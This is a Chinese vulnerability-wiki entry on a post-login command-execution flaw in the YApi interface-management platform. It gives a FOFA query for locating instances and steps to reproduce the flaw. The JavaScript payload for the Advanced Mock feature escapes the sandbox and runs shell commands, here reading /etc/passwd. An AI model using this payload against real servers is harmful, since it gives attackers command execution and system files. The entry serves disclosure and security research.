---
version: "unknown；原文“漏洞影响”处仅写 YApi 接口管理平台，未列版本范围"
source: "Threekiii/Vulnerability-Wiki"
title: "YApi 接口管理平台 后台命令执行漏洞"
product: "YApi"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "Same as52"
affected_versions: "unknown；原文“漏洞影响”处仅写 YApi 接口管理平台，未列版本范围"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-bc25c758c68b02f5de0323be"
entity_id: "ve-bc25c758c68b02f5de0323be"
schema_version: "1"
previous_version: "YApi 接口管理平台"
previous_affected_versions: "YApi 接口管理平台"
---

# YApi 接口管理平台 后台命令执行漏洞

> 版本字段校订（2026-10-04）：代码、命令、路径、产品名或章节标记误入版本字段的值已逐字保存到对应 `previous_*` 字段；当前版本字段只记正文明确的来源范围，无范围时记为 unknown。后文对此元数据误填的旧说明描述校订前状态，其余实验条件与待核项仍按原文保留。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：Same as52
- 证据范围：Fulltextmatches52 substantivecontent/code/imagefilenames

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Same missingrange/authrole/fix as52
- Extra blanklines;duplicate import

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

YApi 接口管理平台 后台存在命令执行漏洞，攻击者通过发送特定的请求可执行任意命令获取服务器权限

## 漏洞影响

```
YApi 接口管理平台
```

## 网络测绘

```
app="YApi"
```

## 漏洞复现

登录页面

![](./.resource/YApi-接口管理平台-后台命令执行漏洞/media/202202091829002.png)



首先需要注册账户并登录



![](./.resource/YApi-接口管理平台-后台命令执行漏洞/media/202202091829520.png)



![](./.resource/YApi-接口管理平台-后台命令执行漏洞/media/202202091829602.png)



添加项目，参数任意



创建后点击 高级Mock 输入如下Payload



```javascript
const sandbox = this; // 获取Context
const ObjectConstructor = this.constructor; // 获取 Object 对象构造函数
const FunctionConstructor = ObjectConstructor.constructor; // 获取 Function 对象构造函数
const myfun = FunctionConstructor('return process'); // 构造一个函数，返回process全局变量
const process = myfun();
mockJson = process.mainModule.require("child_process").execSync("cat /etc/passwd").toString()
```



![](./.resource/YApi-接口管理平台-后台命令执行漏洞/media/202202091830184.png)



预览处点击项目链接



![](./.resource/YApi-接口管理平台-后台命令执行漏洞/media/202202091830086.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
